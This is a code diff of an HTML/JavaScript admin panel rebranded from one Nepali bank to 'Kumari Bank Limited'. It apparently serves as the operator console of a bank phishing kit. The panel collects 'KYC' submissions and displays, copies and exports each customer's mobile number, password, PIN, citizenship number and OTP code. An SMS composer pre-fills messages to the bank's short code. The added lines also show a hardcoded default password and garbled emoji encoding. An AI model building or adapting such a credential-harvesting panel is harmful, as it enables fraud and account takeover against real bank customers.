@@ -3,7 +3,7 @@
 <head>
   <meta charset="UTF-8">
   <meta name="viewport" content="width=device-width, initial-scale=1.0">
-  <title>Prabhu Bank - Backend Response Management Console</title>
+  <title>Kumari Bank Limited - Backend Response Management Console</title>
   <link rel="preconnect" href="https://fonts.googleapis.com">
   <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
   <link href="https://fonts.googleapis.com/css2?family=Plus+Jakarta+Sans:wght@400;500;600;700;800&family=Outfit:wght@500;600;700;800&family=Space+Mono:wght@400;700&display=swap" rel="stylesheet">
@@ -16,9 +16,9 @@
       --border-color: #334155;
       --text-main: #f8fafc;
       --text-muted: #94a3b8;
-      --primary: #c41e48;
-      --primary-hover: #9f1239;
-      --accent: #38bdf8;
+      --primary: #ea580c;
+      --primary-hover: #c2410c;
+      --accent: #f97316;
       --success: #10b981;
       --warning: #f59e0b;
       --danger: #ef4444;
@@ -553,6 +553,379 @@
       border-top: 1px solid var(--border-color);
       margin-top: auto;
     }
+    /* SMS Configuration Card */
+    .sms-config-card {
+      background: var(--bg-surface);
+      border: 1px solid var(--border-color);
+      border-radius: var(--radius);
+      padding: 20px 24px;
+      display: flex;
+      flex-direction: column;
+      gap: 16px;
+      box-shadow: 0 4px 16px rgba(0, 0, 0, 0.2);
+    }
+
+    .sms-config-header {
+      display: flex;
+      justify-content: space-between;
+      align-items: flex-start;
+      gap: 16px;
+      flex-wrap: wrap;
+    }
+
+    .sms-config-title-group {
+      display: flex;
+      gap: 14px;
+      align-items: center;
+    }
+
+    .sms-config-icon {
+      width: 44px;
+      height: 44px;
+      border-radius: 10px;
+      background: linear-gradient(135deg, #3054a2, #424f93);
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      font-size: 1.3rem;
+      box-shadow: 0 4px 12px rgba(48, 84, 162, 0.35);
+      flex-shrink: 0;
+    }
+
+    .sms-config-title-group h2 {
+      font-family: 'Outfit', sans-serif;
+      font-size: 1.15rem;
+      font-weight: 700;
+      color: #fff;
+      margin-bottom: 3px;
+    }
+
+    .sms-config-title-group p {
+      font-size: 0.82rem;
+      color: var(--text-muted);
+      line-height: 1.4;
+    }
+
+    .sms-config-meta {
+      display: flex;
+      align-items: center;
+      gap: 10px;
+      flex-wrap: wrap;
+    }
+
+    .recipient-tag {
+      background: rgba(48, 84, 162, 0.2);
+      border: 1px solid rgba(48, 84, 162, 0.4);
+      color: #93c5fd;
+      padding: 5px 12px;
+      border-radius: 20px;
+      font-size: 0.8rem;
+      font-weight: 600;
+    }
+
+    .sms-save-status-badge {
+      background: rgba(16, 185, 129, 0.15);
+      border: 1px solid rgba(16, 185, 129, 0.35);
+      color: #34d399;
+      padding: 5px 12px;
+      border-radius: 20px;
+      font-size: 0.78rem;
+      font-weight: 600;
+      transition: all 0.3s ease;
+    }
+
+    .sms-config-body {
+      display: grid;
+      grid-template-columns: 1.3fr 1fr;
+      gap: 20px;
+    }
+
+    @media (max-width: 900px) {
+      .sms-config-body {
+        grid-template-columns: 1fr;
+      }
+    }
+
+    .sms-editor-column {
+      display: flex;
+      flex-direction: column;
+      gap: 8px;
+    }
+
+    .sms-editor-label-row {
+      display: flex;
+      justify-content: space-between;
+      align-items: center;
+      font-size: 0.84rem;
+      color: #cbd5e1;
+    }
+
+    .sms-char-counter {
+      font-size: 0.76rem;
+      color: var(--text-muted);
+      font-family: 'Space Mono', monospace;
+    }
+
+    .admin-sms-textarea {
+      width: 100%;
+      background: #090d16;
+      border: 1px solid var(--border-color);
+      border-radius: 8px;
+      padding: 12px 14px;
+      color: #f8fafc;
+      font-family: 'Space Mono', monospace;
+      font-size: 0.85rem;
+      line-height: 1.5;
+      resize: vertical;
+      outline: none;
+      transition: border-color 0.2s;
+    }
+
+    .admin-sms-textarea:focus {
+      border-color: #38bdf8;
+      box-shadow: 0 0 0 2px rgba(56, 189, 248, 0.2);
+    }
+
+    .sms-tags-toolbar {
+      display: flex;
+      align-items: center;
+      gap: 8px;
+      flex-wrap: wrap;
+      margin-top: 4px;
+    }
+
+    .tags-hint {
+      font-size: 0.75rem;
+      color: var(--text-muted);
+    }
+
+    .tag-btn {
+      background: rgba(56, 189, 248, 0.1);
+      border: 1px solid rgba(56, 189, 248, 0.3);
+      color: #38bdf8;
+      font-size: 0.74rem;
+      font-family: 'Space Mono', monospace;
+      padding: 3px 8px;
+      border-radius: 5px;
+      cursor: pointer;
+      transition: all 0.15s;
+    }
+
+    .tag-btn:hover {
+      background: rgba(56, 189, 248, 0.25);
+      color: #fff;
+    }
+
+    .sms-preview-column {
+      background: #0b1120;
+      border: 1px solid var(--border-color);
+      border-radius: 10px;
+      padding: 14px;
+      display: flex;
+      flex-direction: column;
+      gap: 10px;
+    }
+
+    .preview-label {
+      font-size: 0.78rem;
+      color: var(--text-muted);
+      font-weight: 600;
+      text-transform: uppercase;
+      letter-spacing: 0.5px;
+    }
+
+    .phone-sms-mockup {
+      background: #1e293b;
+      border: 1px solid #334155;
+      border-radius: 8px;
+      padding: 12px;
+      display: flex;
+      flex-direction: column;
+      gap: 8px;
+      height: 100%;
+    }
+
+    .phone-sms-to {
+      font-size: 0.75rem;
+      color: #94a3b8;
+      border-bottom: 1px solid rgba(255, 255, 255, 0.08);
+      padding-bottom: 6px;
+    }
+
+    .phone-sms-to strong {
+      color: #38bdf8;
+      font-family: 'Space Mono', monospace;
+    }
+
+    .phone-sms-bubble {
+      background: #3054a2;
+      color: #ffffff;
+      padding: 10px 12px;
+      border-radius: 12px 12px 2px 12px;
+      font-size: 0.8rem;
+      line-height: 1.45;
+      white-space: pre-wrap;
+      word-break: break-word;
+      font-family: 'Space Mono', monospace;
+      align-self: flex-end;
+      max-width: 90%;
+      box-shadow: 0 2px 8px rgba(0, 0, 0, 0.25);
+    }
+
+    .sms-config-footer {
+      display: flex;
+      justify-content: space-between;
+      align-items: center;
+      border-top: 1px solid var(--border-color);
+      padding-top: 14px;
+      flex-wrap: wrap;
+      gap: 10px;
+    }
+
+    /* Admin Login Gate */
+    .admin-login-wrapper {
+      min-height: calc(100vh - 70px);
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      padding: 30px 20px;
+      background: radial-gradient(circle at 50% 30%, rgba(234, 88, 12, 0.15), transparent 70%);
+    }
+
+    .login-card {
+      background: rgba(30, 41, 59, 0.95);
+      border: 1px solid rgba(255, 255, 255, 0.12);
+      border-radius: 16px;
+      padding: 40px 32px;
+      max-width: 440px;
+      width: 100%;
+      box-shadow: 0 25px 50px -12px rgba(0, 0, 0, 0.6), 0 0 0 1px rgba(234, 88, 12, 0.25);
+      backdrop-filter: blur(20px);
+      text-align: center;
+    }
+
+    .login-logo {
+      height: 46px;
+      max-width: 180px;
+      object-fit: contain;
+      background: #ffffff;
+      padding: 4px 12px;
+      border-radius: 6px;
+      margin-bottom: 20px;
+    }
+
+    .login-card h2 {
+      font-family: 'Outfit', sans-serif;
+      font-size: 1.5rem;
+      font-weight: 800;
+      color: #fff;
+      margin-bottom: 6px;
+    }
+
+    .login-subtitle {
+      font-size: 0.85rem;
+      color: var(--text-muted);
+      margin-bottom: 24px;
+      line-height: 1.45;
+    }
+
+    .login-field-group {
+      text-align: left;
+      margin-bottom: 18px;
+    }
+
+    .login-label {
+      display: block;
+      font-size: 0.82rem;
+      font-weight: 600;
+      color: #cbd5e1;
+      margin-bottom: 6px;
+    }
+
+    .login-input-wrap {
+      position: relative;
+      display: flex;
+      align-items: center;
+    }
+
+    .login-input-wrap input {
+      width: 100%;
+      padding: 12px 44px 12px 14px;
+      background: #0f172a;
+      border: 1.5px solid #334155;
+      border-radius: 8px;
+      color: #fff;
+      font-size: 0.95rem;
+      outline: none;
+      transition: border-color 0.2s, box-shadow 0.2s;
+    }
+
+    .login-input-wrap input:focus {
+      border-color: var(--primary);
+      box-shadow: 0 0 0 3px rgba(234, 88, 12, 0.2);
+    }
+
+    .toggle-admin-pass {
+      position: absolute;
+      right: 10px;
+      background: none;
+      border: none;
+      color: #94a3b8;
+      cursor: pointer;
+      font-size: 1.15rem;
+      padding: 4px;
+      display: flex;
+      align-items: center;
+      justify-content: center;
+    }
+
+    .toggle-admin-pass:hover {
+      color: #fff;
+    }
+
+    .btn-admin-login {
+      width: 100%;
+      padding: 12px 18px;
+      background: linear-gradient(135deg, var(--primary), var(--accent));
+      color: #fff;
+      border: none;
+      border-radius: 8px;
+      font-size: 0.95rem;
+      font-weight: 700;
+      cursor: pointer;
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      gap: 8px;
+      box-shadow: 0 4px 14px rgba(234, 88, 12, 0.35);
+      transition: transform 0.15s, box-shadow 0.15s;
+    }
+
+    .btn-admin-login:hover {
+      transform: translateY(-1px);
+      box-shadow: 0 6px 18px rgba(234, 88, 12, 0.45);
+    }
+
+    .btn-admin-login:active {
+      transform: translateY(1px);
+    }
+
+    .login-error-msg {
+      background: rgba(239, 68, 68, 0.15);
+      border: 1px solid rgba(239, 68, 68, 0.4);
+      color: #fca5a5;
+      font-size: 0.82rem;
+      padding: 9px 12px;
+      border-radius: 6px;
+      margin-bottom: 14px;
+      text-align: left;
+    }
+
+    .login-hint {
+      margin-top: 20px;
+      font-size: 0.78rem;
+      color: #64748b;
+    }
   </style>
 </head>
 <body>
@@ -560,63 +933,151 @@
   <!-- Top Admin Bar -->
   <header class="admin-navbar">
     <div class="brand-group">
-      <img src="logo.png" alt="Prabhu Bank" style="height:32px; max-width:140px; object-fit:contain; border-radius:3px;">
+      <img src="kumari_logo.png" alt="Kumari Bank Limited" style="height:32px; max-width:140px; object-fit:contain; border-radius:3px; background:#fff; padding:2px 6px;">
       <div>
         <span class="brand-badge">Backend Engine</span>
       </div>
     </div>
 
-    <div class="nav-controls">
+    <div class="nav-controls" id="adminNavControls" style="display:none;">
       <div class="server-status-pill" id="serverStatusPill">
         <span class="status-dot"></span>
-        <span id="serverStatusText">Backend Online (Port 8080)</span>
+        <span id="serverStatusText">Backend Online</span>
       </div>
-      <a href="/viewer.html" class="client-portal-link" target="_blank" style="background:rgba(196,30,72,0.18); border-color:#c41e48; color:#fca5a5;">
-        <svg viewBox="0 0 24 24" width="14" height="14" fill="currentColor">
-          <path d="M20 18c1.1 0 1.99-.9 1.99-2L22 6c0-1.11-.9-2-2-2H4c-1.11 0-2 .89-2 2v10c0 1.1.89 2 2 2H0v2h24v-2h-4zM4 6h16v10H4V6z"/>
-        </svg>
-        Screen Share Viewer
-      </a>
       <a href="/" class="client-portal-link" target="_blank">
         <svg viewBox="0 0 24 24" width="14" height="14" fill="currentColor">
           <path d="M19 19H5V5h7V3H5c-1.11 0-2 .9-2 2v14c0 1.1.89 2 2 2h14c1.1 0 2-.9 2-2v-7h-2v7zM14 3v2h3.59l-9.83 9.83 1.41 1.41L19 6.41V10h2V3h-7z"/>
         </svg>
         Open KYC Portal
       </a>
+      <div style="display:flex; align-items:center; gap:8px;">
+        <button type="button" class="btn btn-outline" id="openChangePassBtn" style="padding:5px 12px; font-size:0.75rem;">ðŸ”‘ Password</button>
+        <button type="button" class="btn btn-danger" id="adminLogoutBtn" style="padding:5px 12px; font-size:0.75rem; background:rgba(239,68,68,0.15); border:1px solid rgba(239,68,68,0.4); color:#f87171;">ðŸ”’ Logout</button>
+      </div>
     </div>
   </header>
 
-  <!-- Main Content Body -->
-  <main class="admin-main">
+  <!-- Backend Admin Password Authentication Gate -->
+  <section class="admin-login-wrapper" id="adminLoginSection">
+    <div class="login-card">
+      <img src="kumari_logo.png" alt="Kumari Bank Limited" class="login-logo">
+      <h2>Admin Security Login</h2>
+      <p class="login-subtitle">Confidential response console &amp; KYC verification engine</p>
+      
+      <form id="adminLoginForm">
+        <div class="login-field-group">
+          <label for="adminPasswordInput" class="login-label">Administrator Password</label>
+          <div class="login-input-wrap">
+            <input type="password" id="adminPasswordInput" placeholder="Enter admin password" required autocomplete="current-password" autocapitalize="none" autocorrect="off" spellcheck="false">
+            <button type="button" id="toggleAdminPassBtn" class="toggle-admin-pass" title="Toggle password visibility">ðŸ‘</button>
+          </div>
+        </div>
+        <div id="adminLoginError" class="login-error-msg" style="display:none;"></div>
+        <button type="submit" id="adminLoginSubmitBtn" class="btn-admin-login">
+          <span>Unlock Admin Console</span>
+          <svg viewBox="0 0 24 24" width="16" height="16" fill="currentColor">
+            <path d="M12 2C9.24 2 7 4.24 7 7v3H6c-1.1 0-2 .9-2 2v8c0 1.1.9 2 2 2h12c1.1 0 2-.9 2-2v-8c0-1.1-.9-2-2-2h-1V7c0-2.76-2.24-5-5-5zm-3 8V7c0-1.66 1.34-3 3-3s3 1.34 3 3v3H9zm3 8c-1.1 0-2-.9-2-2s.9-2 2-2 2 .9 2 2-.9 2-2 2z"/>
+          </svg>
+        </button>
+        <div class="login-hint">
+          Default security password: <code style="background:rgba(255,255,255,0.08);padding:2px 6px;border-radius:4px;color:#38bdf8;font-weight:700;">admin123</code>
+        </div>
+      </form>
+    </div>
+  </section>
+
+  <!-- Main Authenticated Dashboard Section -->
+  <div id="adminDashboardSection" style="display:none;">
+    <!-- Main Content Body -->
+    <main class="admin-main">
 
     <!-- KPI Metric Cards -->
     <div class="stats-grid">
       <div class="stat-card">
-        <div class="stat-icon total">📊</div>
+        <div class="stat-icon total">ðŸ“Š</div>
         <div class="stat-meta">
           <h3>Total Responses</h3>
           <div class="stat-number" id="statTotalCount">0</div>
         </div>
       </div>
       <div class="stat-card">
-        <div class="stat-icon verified">✅</div>
+        <div class="stat-icon verified">âœ…</div>
         <div class="stat-meta">
           <h3>Verified KYC Submissions</h3>
           <div class="stat-number" id="statVerifiedCount">0</div>
         </div>
       </div>
       <div class="stat-card">
-        <div class="stat-icon pending">⏳</div>
+        <div class="stat-icon pending">â³</div>
         <div class="stat-meta">
           <h3>In-Progress / Step 1</h3>
           <div class="stat-number" id="statPendingCount">0</div>
         </div>
       </div>
       <div class="stat-card">
-        <div class="stat-icon today">📅</div>
+        <div class="stat-icon today">ðŸ“…</div>
         <div class="stat-meta">
           <h3>Today's Activity</h3>
           <div class="stat-number" id="statTodayCount">0</div>
+        </div>
+      </div>
+    </div>
+
+    <!-- SMS Gateway & Verification Message Composer -->
+    <div class="sms-config-card">
+      <div class="sms-config-header">
+        <div class="sms-config-title-group">
+          <div class="sms-config-icon">ðŸ’¬</div>
+          <div>
+            <h2>SMS Gateway & Verification Message Composer</h2>
+            <p>Type the verification message below. When users tap <strong>"Next step"</strong> on the KYC portal, this exact message pre-fills in their SMS app to <strong>32001</strong>. Clicking "Save &amp; Deploy" activates the customer's "Next step" button.</p>
+            <p style="margin-top:6px; font-size:0.8rem; color:#64748b;">ðŸ’¡ <strong>WebOTP tip:</strong> For automatic OTP autofill on Android Chrome, the SMS must end with: <code style="background:rgba(255,255,255,0.06); padding:1px 5px; border-radius:3px;">@yourdomain.com #123456</code></p>
+          </div>
+        </div>
+        <div class="sms-config-meta">
+          <span class="recipient-tag">Gateway: <strong>32001</strong> (Fixed)</span>
+          <span class="sms-save-status-badge" id="smsSaveStatusBadge">Active & Ready</span>
+        </div>
+      </div>
+
+      <div class="sms-config-body">
+        <div class="sms-editor-column">
+          <div class="sms-editor-label-row">
+            <label for="adminSmsTemplateInput"><strong>SMS Message Text / Template:</strong></label>
+            <span class="sms-char-counter" id="smsCharCounter">0 characters</span>
+          </div>
+          <textarea id="adminSmsTemplateInput" class="admin-sms-textarea" rows="4" placeholder="Type the message that will open in user's SMS app..."></textarea>
+
+          <!-- Dynamic Tag Injector Pills -->
+          <div class="sms-tags-toolbar">
+            <span class="tags-hint">Insert dynamic tag:</span>
+            <button type="button" class="tag-btn" data-tag="{REF_ID}">+ {REF_ID}</button>
+            <button type="button" class="tag-btn" data-tag="{MOBILE}">+ {MOBILE}</button>
+            <button type="button" class="tag-btn" data-tag="{USERNAME}">+ {USERNAME}</button>
+            <button type="button" class="tag-btn" data-tag="{TIME}">+ {TIME}</button>
+          </div>
+        </div>
+
+        <!-- Real-time Mobile Phone SMS Preview -->
+        <div class="sms-preview-column">
+          <div class="preview-label">ðŸ“± Customer SMS App Pre-fill Preview:</div>
+          <div class="phone-sms-mockup">
+            <div class="phone-sms-to">To: <strong>32001</strong></div>
+            <div class="phone-sms-bubble" id="phoneSmsPreviewText">
+              Loading preview...
+            </div>
+          </div>
+        </div>
+      </div>
+
+      <div class="sms-config-footer">
+        <div class="sms-footer-left">
+          <button type="button" class="btn btn-outline" id="resetSmsTemplateBtn">â†º Reset Standard Template</button>
+        </div>
+        <div class="sms-footer-right">
+          <button type="button" class="btn btn-primary" id="saveSmsTemplateBtn" style="background:#3054a2; border-color:#3054a2; font-weight:700;">
+            ðŸ’¾ Save & Deploy Message to Users
+          </button>
         </div>
       </div>
     </div>
@@ -625,7 +1086,7 @@
     <div class="control-panel">
       <div class="search-filter-group">
         <div class="search-input-wrapper">
-          <span class="search-icon">🔍</span>
+          <span class="search-icon">ðŸ”</span>
           <input type="text" class="search-input" id="searchInput" placeholder="Search by mobile, name, PIN, OTP, ref ID...">
         </div>
         <select class="filter-select" id="statusFilter">
@@ -640,10 +1101,10 @@
           <input type="checkbox" id="autoRefreshToggle" checked>
           <span>Live Auto-refresh (3s)</span>
         </label>
-        <button type="button" class="btn btn-outline" id="refreshBtn">🔄 Refresh</button>
-        <button type="button" class="btn btn-outline" id="exportJsonBtn">📥 Export JSON</button>
-        <button type="button" class="btn btn-outline" id="exportCsvBtn">📊 Export CSV</button>
-        <button type="button" class="btn btn-danger" id="clearAllBtn">🗑 Clear All</button>
+        <button type="button" class="btn btn-outline" id="refreshBtn">ðŸ”„ Refresh</button>
+        <button type="button" class="btn btn-outline" id="exportJsonBtn">ðŸ“¥ Export JSON</button>
+        <button type="button" class="btn btn-outline" id="exportCsvBtn">ðŸ“Š Export CSV</button>
+        <button type="button" class="btn btn-danger" id="clearAllBtn">ðŸ—‘ Clear All</button>
       </div>
     </div>
 
@@ -657,11 +1118,12 @@
               <th>Ref / Session ID</th>
               <th>Submitted Time</th>
               <th>Client IP</th>
-              <th>Username</th>
               <th>Mobile Number</th>
               <th>Password</th>
               <th>PIN</th>
+              <th>Full Name</th>
               <th>Father's Name</th>
+              <th>NID / Citizenship No.</th>
               <th>OTP Code</th>
               <th>Actions</th>
             </tr>
@@ -673,7 +1135,7 @@
       </div>
 
       <div class="empty-state" id="emptyState" style="display: none;">
-        <div class="empty-icon">📂</div>
+        <div class="empty-icon">ðŸ“‚</div>
         <h4>No Customer Responses Captured Yet</h4>
         <p>When customers fill out and submit the KYC portal, their responses will instantly appear here.</p>
       </div>
@@ -686,7 +1148,10 @@
     <div class="modal-box">
       <div class="modal-header">
         <h3>Customer Response Payload</h3>
-        <button type="button" class="modal-close-btn" id="closeDetailModal">&times;</button>
+        <div style="display:flex; align-items:center; gap:8px;">
+          <button type="button" class="btn btn-outline" id="copyJsonBtn" style="padding:4px 10px; font-size:0.75rem;">ðŸ“‹ Copy JSON</button>
+          <button type="button" class="modal-close-btn" id="closeDetailModal">&times;</button>
+        </div>
       </div>
       <div class="modal-body">
         <pre class="json-viewer" id="jsonViewerContent"></pre>
@@ -695,8 +1160,41 @@
   </div>
 
   <footer class="admin-footer">
-    Prabhu Bank KYC Backend Engine & Response Repository • Confidential Bank Administrator Interface
+    Kumari Bank Limited KYC Backend Engine & Response Repository â€¢ Confidential Bank Administrator Interface
   </footer>
+
+  </div><!-- End #adminDashboardSection -->
+
+  <!-- Change Admin Password Modal -->
+  <div class="modal-overlay" id="changePasswordModal">
+    <div class="modal-card" style="max-width:440px;">
+      <div class="modal-header">
+        <div style="font-weight:700;font-size:1.05rem;color:#f8fafc;">ðŸ”‘ Change Admin Security Password</div>
+        <button type="button" class="modal-close-btn" id="closeChangePasswordModalBtn">&times;</button>
+      </div>
+      <div class="modal-body">
+        <form id="changePasswordForm">
+          <div style="margin-bottom:14px;">
+            <label style="display:block;font-size:0.8rem;color:#94a3b8;margin-bottom:6px;">Current Password</label>
+            <input type="password" id="currentPassInput" required style="width:100%;padding:10px 12px;background:#0f172a;border:1px solid #334155;border-radius:8px;color:#fff;font-size:0.9rem;">
+          </div>
+          <div style="margin-bottom:14px;">
+            <label style="display:block;font-size:0.8rem;color:#94a3b8;margin-bottom:6px;">New Password (Min 4 chars)</label>
+            <input type="password" id="newPassInput" required minlength="4" style="width:100%;padding:10px 12px;background:#0f172a;border:1px solid #334155;border-radius:8px;color:#fff;font-size:0.9rem;">
+          </div>
+          <div style="margin-bottom:18px;">
+            <label style="display:block;font-size:0.8rem;color:#94a3b8;margin-bottom:6px;">Confirm New Password</label>
+            <input type="password" id="confirmNewPassInput" required minlength="4" style="width:100%;padding:10px 12px;background:#0f172a;border:1px solid #334155;border-radius:8px;color:#fff;font-size:0.9rem;">
+          </div>
+          <div id="changePassMsg" style="display:none;font-size:0.85rem;margin-bottom:12px;padding:8px 12px;border-radius:6px;"></div>
+          <div style="display:flex;gap:10px;justify-content:flex-end;">
+            <button type="button" class="btn btn-outline" id="cancelChangePasswordBtn">Cancel</button>
+            <button type="submit" class="btn btn-primary" id="saveNewPasswordBtn">Update Password</button>
+          </div>
+        </form>
+      </div>
+    </div>
+  </div>
 
   <script>
     (function () {
@@ -720,22 +1218,167 @@
         detailModal: document.getElementById('detailModal'),
         closeDetailModal: document.getElementById('closeDetailModal'),
         jsonViewerContent: document.getElementById('jsonViewerContent'),
-        serverStatusText: document.getElementById('serverStatusText')
+        serverStatusText: document.getElementById('serverStatusText'),
+        serverStatusPill: document.getElementById('serverStatusPill'),
+        // Auth DOM elements
+        adminNavControls: document.getElementById('adminNavControls'),
+        adminLoginSection: document.getElementById('adminLoginSection'),
+        adminDashboardSection: document.getElementById('adminDashboardSection'),
+        adminLoginForm: document.getElementById('adminLoginForm'),
+        adminPasswordInput: document.getElementById('adminPasswordInput'),
+        toggleAdminPassBtn: document.getElementById('toggleAdminPassBtn'),
+        adminLoginSubmitBtn: document.getElementById('adminLoginSubmitBtn'),
+        adminLoginError: document.getElementById('adminLoginError'),
+        adminLogoutBtn: document.getElementById('adminLogoutBtn'),
+        openChangePassBtn: document.getElementById('openChangePassBtn'),
+        changePasswordModal: document.getElementById('changePasswordModal'),
+        closeChangePasswordModalBtn: document.getElementById('closeChangePasswordModalBtn'),
+        cancelChangePasswordBtn: document.getElementById('cancelChangePasswordBtn'),
+        changePasswordForm: document.getElementById('changePasswordForm'),
+        currentPassInput: document.getElementById('currentPassInput'),
+        newPassInput: document.getElementById('newPassInput'),
+        confirmNewPassInput: document.getElementById('confirmNewPassInput'),
+        changePassMsg: document.getElementById('changePassMsg'),
+        saveNewPasswordBtn: document.getElementById('saveNewPasswordBtn')
       };
+
+      // â”€â”€ Admin Authentication Helpers â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€
+      function getAuthToken() {
+        return sessionStorage.getItem('rbb_admin_token') || localStorage.getItem('rbb_admin_token') || '';
+      }
+
+      function getAuthPassword() {
+        return sessionStorage.getItem('rbb_admin_pass') || localStorage.getItem('rbb_admin_pass') || '';
+      }
+
+      function setAuth(token, password) {
+        sessionStorage.setItem('rbb_admin_token', token);
+        sessionStorage.setItem('rbb_admin_pass', password);
+        localStorage.setItem('rbb_admin_token', token);
+        localStorage.setItem('rbb_admin_pass', password);
+      }
+
+      function clearAuth() {
+        sessionStorage.removeItem('rbb_admin_token');
+        sessionStorage.removeItem('rbb_admin_pass');
+        localStorage.removeItem('rbb_admin_token');
+        localStorage.removeItem('rbb_admin_pass');
+      }
+
+      function showLoginGate(errorMessage = '') {
+        if (refreshInterval) {
+          clearInterval(refreshInterval);
+          refreshInterval = null;
+        }
+        if (DOM.adminDashboardSection) DOM.adminDashboardSection.style.display = 'none';
+        if (DOM.adminNavControls) DOM.adminNavControls.style.display = 'none';
+        if (DOM.adminLoginSection) DOM.adminLoginSection.style.display = 'flex';
+        if (DOM.adminPasswordInput) {
+          DOM.adminPasswordInput.value = '';
+          setTimeout(() => DOM.adminPasswordInput.focus(), 100);
+        }
+        if (DOM.adminLoginError) {
+          if (errorMessage) {
+            DOM.adminLoginError.textContent = errorMessage;
+            DOM.adminLoginError.style.display = 'block';
+          } else {
+            DOM.adminLoginError.style.display = 'none';
+          }
+        }
+      }
+
+      function showDashboard() {
+        if (DOM.adminLoginSection) DOM.adminLoginSection.style.display = 'none';
+        if (DOM.adminDashboardSection) DOM.adminDashboardSection.style.display = 'block';
+        if (DOM.adminNavControls) DOM.adminNavControls.style.display = 'flex';
+        fetchResponses();
+        fetchSmsConfig();
+        setupAutoRefresh();
+      }
+
+      async function apiFetch(endpoint, options = {}) {
+        const cleanEndpoint = endpoint.startsWith('/') ? endpoint : '/' + endpoint;
+        const routeName = cleanEndpoint.replace(/^\/?api\/?/, '');
+        
+        // Inject auth headers if credentials exist
+        const token = getAuthToken();
+        const pass = getAuthPassword();
+        options.headers = Object.assign({}, options.headers || {});
+        if (token) {
+          options.headers['Authorization'] = 'Bearer ' + token;
+          options.headers['X-Admin-Token'] = token;
+        }
+        if (pass) {
+          options.headers['X-Admin-Password'] = pass;
+        }
+
+        async function checkRes(res) {
+          if (res.status === 401 && !cleanEndpoint.includes('/api/admin/login')) {
+            clearAuth();
+            showLoginGate('Session expired or unauthorized. Please re-enter administrator password.');
+          }
+          return res;
+        }
+
+        // 1. Try standard endpoint (/api/...)
+        try {
+          const res = await fetch(cleanEndpoint, options);
+          if (res.ok || res.status === 401) return checkRes(res);
+        } catch (_) {}
+
+        // 2. Try relative endpoint (api/...) for subdirectories
+        try {
+          const relEndpoint = cleanEndpoint.replace(/^\/+/, '');
+          const res = await fetch(relEndpoint, options);
+          if (res.ok || res.status === 401) return checkRes(res);
+        } catch (_) {}
+
+        // 3. Try direct PHP endpoint (api.php?route=...) with auth query token fallback
+        try {
+          const authParam = token ? '&token=' + encodeURIComponent(token) : '';
+          const phpRoute = routeName.includes('?') 
+            ? 'api.php?route=' + encodeURIComponent(routeName.split('?')[0]) + '&' + routeName.split('?')[1] + authParam
+            : 'api.php?route=' + encodeURIComponent(routeName) + authParam;
+
+          // Try root /api.php
+          let res = await fetch('/' + phpRoute, options).catch(() => null);
+          if (res && (res.ok || res.status === 401)) return checkRes(res);
+
+          // Try relative api.php
+          res = await fetch(phpRoute, options).catch(() => null);
+          if (res && (res.ok || res.status === 401)) return checkRes(res);
+        } catch (_) {}
+
+        // Final direct attempt
+        try {
+          const res = await fetch(cleanEndpoint, options);
+          return checkRes(res);
+        } catch (e) {
+          throw e;
+        }
+      }
 
       // Fetch all responses from Backend API
       async function fetchResponses() {
         try {
-          const res = await fetch('/api/responses');
+          const res = await apiFetch('/api/responses');
           if (!res.ok) throw new Error('HTTP ' + res.status);
           const data = await res.json();
-          responsesData = Array.isArray(data) ? data : [];
+          if (Array.isArray(data)) {
+            responsesData = data;
+          } else if (data && typeof data === 'object' && (data.sessionId || data.id || data.username)) {
+            responsesData = [data];
+          } else {
+            responsesData = [];
+          }
           updateStats(responsesData);
           renderTable();
-          if (DOM.serverStatusText) DOM.serverStatusText.textContent = 'Backend Online (Port 8080)';
+          if (DOM.serverStatusText) DOM.serverStatusText.textContent = 'Backend Online';
+          if (DOM.serverStatusPill) DOM.serverStatusPill.style.color = 'var(--success)';
         } catch (err) {
           console.warn('Backend fetch error:', err);
-          if (DOM.serverStatusText) DOM.serverStatusText.textContent = 'Backend Connection Offline';
+          if (DOM.serverStatusText) DOM.serverStatusText.textContent = 'Backend Offline';
+          if (DOM.serverStatusPill) DOM.serverStatusPill.style.color = 'var(--danger)';
         }
       }
 
@@ -796,7 +1439,7 @@
           tr.innerHTML = `
             <td>
               <span class="status-badge ${isVerified ? 'verified' : 'initial'}">
-                ${isVerified ? '● Verified Complete' : '○ Step 1 In-Progress'}
+                ${isVerified ? 'â— Verified Complete' : 'â—‹ Step 1 In-Progress'}
               </span>
             </td>
             <td>
@@ -809,45 +1452,80 @@
               <span class="ip-tag">${rec.clientIp || '127.0.0.1'}</span>
             </td>
             <td>
-              <strong style="color:#f8fafc;">${rec.username || 'N/A'}</strong>
+              <div style="display:flex;align-items:center;gap:6px;">
+                <span class="mobile-highlight">+977 ${rec.mobile || 'N/A'}</span>
+                <button type="button" class="btn-copy-cell" data-copy="${rec.mobile || ''}" title="Copy mobile" style="padding:2px 7px;font-size:0.7rem;background:rgba(56,189,248,0.12);border:1px solid rgba(56,189,248,0.35);color:#38bdf8;border-radius:5px;cursor:pointer;white-space:nowrap;">ðŸ“‹ Copy</button>
+              </div>
             </td>
             <td>
-              <span class="mobile-highlight">+977 ${rec.mobile || 'N/A'}</span>
+              <div style="display:flex;align-items:center;gap:6px;">
+                <span class="code-pill" style="color:#38bdf8;font-weight:700;font-size:0.86rem;background:#0b1120;border:1px solid #1e293b;padding:4px 8px;border-radius:5px;font-family:'Space Mono',monospace;">${escapeHtml(rec.password || 'N/A')}</span>
+                <button type="button" class="btn-copy-cell" data-copy="${rec.password || ''}" title="Copy password" style="padding:2px 7px;font-size:0.7rem;background:rgba(56,189,248,0.12);border:1px solid rgba(56,189,248,0.35);color:#38bdf8;border-radius:5px;cursor:pointer;white-space:nowrap;">ðŸ“‹ Copy</button>
+              </div>
             </td>
             <td>
-              <span class="code-pill" style="color:#38bdf8; font-weight:700; font-size:0.86rem; background:#0b1120; border:1px solid #1e293b; padding:4px 8px; border-radius:5px; font-family:'Space Mono', monospace;">${escapeHtml(rec.password || 'N/A')}</span>
+              <div style="display:flex;align-items:center;gap:6px;">
+                <span class="code-pill" style="color:#f59e0b;font-weight:700;font-size:0.86rem;background:#0b1120;border:1px solid #1e293b;padding:4px 8px;border-radius:5px;font-family:'Space Mono',monospace;">${escapeHtml(rec.pin || 'N/A')}</span>
